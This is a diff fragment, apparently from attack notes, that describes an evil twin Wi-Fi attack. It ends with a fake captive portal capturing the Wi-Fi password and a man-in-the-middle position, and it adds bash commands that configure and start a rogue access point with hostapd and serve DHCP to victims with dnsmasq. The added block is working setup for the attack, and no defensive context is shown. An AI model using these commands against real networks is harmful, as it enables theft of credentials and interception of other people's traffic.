@@ -14,3 +14,20 @@ Attack flow:
 5. Attacker serves a captive portal (fake login page) asking for Wi-Fi password
 6. Victim enters the password — attacker captures it in plaintext
 7. All traffic now flows through the attacker — full MITM position
+
+```bash
+# using hostapd-wpe to set up a rogue AP
+# first create hostapd config
+cat > evil_twin.conf << EOF
+interface=wlan0
+driver=nl80211
+ssid=TargetNetwork
+channel=6
+EOF
+
+# start the fake AP
+hostapd evil_twin.conf
+
+# use dnsmasq to handle DHCP so victims get an IP
+dnsmasq --interface=wlan0 --dhcp-range=192.168.1.2,192.168.1.30
+```
